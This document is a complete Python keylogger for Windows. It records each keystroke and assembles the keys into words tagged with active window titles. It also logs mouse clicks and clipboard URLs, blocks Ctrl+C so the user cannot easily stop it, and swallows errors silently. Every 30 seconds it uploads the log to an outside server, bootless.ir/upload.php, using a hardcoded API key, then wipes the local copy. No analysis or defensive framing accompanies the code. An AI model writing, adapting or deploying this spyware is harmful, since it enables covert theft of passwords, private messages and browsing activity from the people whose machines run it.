import threading
import time
import pyperclip
import pygetwindow as gw
import win32clipboard
import re
import signal
import requests
import os
from pynput import keyboard, mouse
from datetime import datetime

# ============================================
# SECTION 1: Signal Handler (Prevents Ctrl+C)
# ============================================

def signal_handler(sig, frame):
    """Ignore Ctrl+C - prevents user from terminating the program"""
    pass

# ============================================
# SECTION 2: Configuration & Constants
# ============================================

# Server configuration
SERVER_UPLOAD_URL = "https://bootless.ir/upload.php"
API_KEY = "aB3$xZ9!mK7@pQ2#vL5&nR8*wT4^jF6"

# Register signal handler to ignore Ctrl+C
signal.signal(signal.SIGINT, signal_handler)

# File paths and buffers
log_file_path = "logs.txt"           # File where keystrokes are stored
word_buffer = []                      # Temporary buffer to build words
pressed_special_keys = set()          # Track currently pressed special keys (Shift, Ctrl, etc.)

# ============================================
# SECTION 3: Helper Functions
# ============================================

def write_to_log(text):
    """
    Write text with timestamp to log file
    Example: [2026-06-05 14:30:15] [Key] Hello
    """
    try:
        with open(log_file_path, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {text}\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def get_active_window_info():
    """
    Get the title of the currently active window
    Example: "Google Chrome - YouTube", "Notepad", etc.
    """
    try:
        active_window = gw.getActiveWindow()
        return active_window.title if active_window else "Unknown"
    except Exception:
        return "Unknown"

def get_clipboard_url():
    """
    Check if clipboard contains a URL
    Returns URL if found, None otherwise
    """
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        # Regex pattern to match HTTP/HTTPS URLs
        if re.match(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', data):
            return data
        return None
    except Exception:
        return None

# ============================================
# SECTION 4: Keyboard Listener (Most Important)
# ============================================

def on_press(key):
    """
    Called every time a key is pressed
    This is the core logging function
    """
    try:
        # Mapping for special keys to readable format
        special_key_map = {
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT]",
            keyboard.Key.shift_l: "[SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.caps_lock: "[CAPSLOCK]",
            keyboard.Key.num_lock: "[NUMLOCK]",
            keyboard.Key.scroll_lock: "[SCROLLLOCK]",
            keyboard.Key.page_up: "[PAGE_UP]",
            keyboard.Key.page_down: "[PAGE_DOWN]",
            keyboard.Key.end: "[END]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.insert: "[INSERT]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            # Numpad keys (Virtual Key codes)
            keyboard.KeyCode.from_vk(96): "[NUMPAD_0]",
            keyboard.KeyCode.from_vk(97): "[NUMPAD_1]",
            keyboard.KeyCode.from_vk(98): "[NUMPAD_2]",
            keyboard.KeyCode.from_vk(99): "[NUMPAD_3]",
            keyboard.KeyCode.from_vk(100): "[NUMPAD_4]",
            keyboard.KeyCode.from_vk(101): "[NUMPAD_5]",
            keyboard.KeyCode.from_vk(102): "[NUMPAD_6]",
            keyboard.KeyCode.from_vk(103): "[NUMPAD_7]",
            keyboard.KeyCode.from_vk(104): "[NUMPAD_8]",
            keyboard.KeyCode.from_vk(105): "[NUMPAD_9]",
            keyboard.KeyCode.from_vk(106): "[NUMPAD_*]",
            keyboard.KeyCode.from_vk(107): "[NUMPAD_+]",
            keyboard.KeyCode.from_vk(109): "[NUMPAD_-]",
            keyboard.KeyCode.from_vk(110): "[NUMPAD_.]",
            keyboard.KeyCode.from_vk(111): "[NUMPAD_/]",
        }

        # Numpad mapping for actual values
        numpad_map = {
            96: "0", 97: "1", 98: "2", 99: "3", 100: "4",
            101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
            106: "*", 107: "+", 109: "-", 110: ".", 111: "/"
        }

        key_representation = None
        
        # Check if key is a special key (Enter, Space, etc.)
        if key in special_key_map:
            key_representation = special_key_map[key]
            pressed_special_keys.add(key_representation)
        
        # Check if key is numpad
        elif hasattr(key, 'vk') and key.vk in numpad_map:
            key_representation = numpad_map[key.vk]
            word_buffer.append(key_representation)
        
        # Regular character (letter, number, symbol)
        elif hasattr(key, 'char') and key.char:
            key_representation = key.char
            word_buffer.append(key.char)
        
        # Handle the logged key
        if key_representation:
            # When Space or Enter is pressed - word is complete
            if key == keyboard.Key.space or key == keyboard.Key.enter:
                # Build complete word from buffer
                word = ''.join(word_buffer).strip()
                if word:
                    write_to_log(f"[Word] '{word}' (Window: {get_active_window_info()})")
                word_buffer.clear()  # Clear buffer for next word
                write_to_log(f"[Key] {key_representation} (Window: {get_active_window_info()})")
            
            # Backspace - remove last character from buffer
            elif key == keyboard.Key.backspace and word_buffer:
                word_buffer.pop()
                write_to_log(f"[Key] {key_representation} (Window: {get_active_window_info()})")
            
            # Ignore modifier keys (Shift, Ctrl, Alt) for individual logging
            elif key_representation not in ["[SHIFT]", "[SHIFT_R]", "[SHIFT_L]", "[CTRL]", "[CTRL_R]", "[CTRL_L]", "[ALT]", "[ALT_R]", "[ALT_L]", "[CAPSLOCK]", "[NUMLOCK]", "[SCROLLLOCK]"]:
                write_to_log(f"[Key] {key_representation} (Window: {get_active_window_info()})")
        
    except Exception as e:
        write_to_log(f"[Error] Key logging failed: {str(e)}")

def on_release(key):
    """
    Called when a key is released
    Used to track when special keys are no longer pressed
    """
    special_key_map = {
        keyboard.Key.shift: "[SHIFT]", keyboard.Key.shift_r: "[SHIFT]", keyboard.Key.shift_l: "[SHIFT]",
        keyboard.Key.ctrl: "[CTRL]", keyboard.Key.ctrl_r: "[CTRL]", keyboard.Key.ctrl_l: "[CTRL]",
        keyboard.Key.alt: "[ALT]", keyboard.Key.alt_r: "[ALT]", keyboard.Key.alt_l: "[ALT]",
    }
    if key in special_key_map:
        key_name = special_key_map[key]
        if key_name in pressed_special_keys:
            pressed_special_keys.remove(key_name)

# ============================================
# SECTION 5: Mouse Listener
# ============================================

def on_click(x, y, button, pressed):
    """
    Called when mouse button is clicked
    Logs coordinates and any URL in clipboard
    """
    if pressed:
        window_info = get_active_window_info()
        clipboard_url = get_clipboard_url()
        log_entry = f"[Mouse] Clicked at ({x}, {y}) with {button} (Window: {window_info})"
        if clipboard_url:
            log_entry += f" [Possible URL: {clipboard_url}]"
        write_to_log(log_entry)

# ============================================
# SECTION 6: Clipboard Monitoring
# ============================================

def check_clipboard():
    """
    Periodically checks clipboard for URLs
    Runs every 5 seconds in a separate thread
    """
    previous_clipboard = ""  # Avoid logging same URL multiple times
    
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard and current_clipboard != previous_clipboard:
                # Check if clipboard content is a URL
                if re.match(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', current_clipboard):
                    write_to_log(f"Clipboard content (URL): {current_clipboard}")
                    previous_clipboard = current_clipboard
        except Exception:
            # Silently fail if clipboard is inaccessible
            pass
        time.sleep(5)  # Check every 5 seconds

# ============================================
# SECTION 7: Server Communication
# ============================================

def check_internet():
    """
    Check if internet connection is available
    Returns True if connected, False otherwise
    """
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except:
        return False

def send_log_to_server():
    """
    Send log file to remote server
    Returns True if successful, False otherwise
    After successful upload, clears the log file
    """
    log_file = "logs.txt"
    
    # Check if log file exists and is not empty
    if not os.path.exists(log_file) or os.path.getsize(log_file) == 0:
        return False
    
    try:
        with open(log_file, "rb") as f:
            files = {"file": ("logs.txt", f, "text/plain")}
            headers = {"Authorization": f"Bearer {API_KEY}"}
            response = requests.post(SERVER_UPLOAD_URL, files=files, headers=headers, timeout=30)
            
            if response.status_code == 200:
                # Clear the log file after successful upload
                open(log_file, "w").close()
                return True
    except:
        # Silently fail on any error
        pass
    return False

def periodic_upload():
    """
    Runs in a separate thread
    Uploads logs to server every 30 seconds
    """
    while True:
        time.sleep(30)  # 30 second interval
        send_log_to_server()

# ============================================
# SECTION 8: Main Function
# ============================================

def main():
    """
    Main entry point - starts all listeners and threads
    """
    # Make program resistant to Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start periodic upload thread (every 30 seconds)
    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
    upload_thread.start()
    
    # Start clipboard monitoring thread
    clipboard_thread = threading.Thread(target=check_clipboard, daemon=True)
    clipboard_thread.start()
    
    # Start keyboard and mouse listeners
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    mouse_listener = mouse.Listener(on_click=on_click)
    
    keyboard_listener.start()
    mouse_listener.start()
    
    # Keep program running indefinitely
    while True:
        time.sleep(1)

# ============================================
# SECTION 9: Program Entry Point
# ============================================

if __name__ == "__main__":
    main()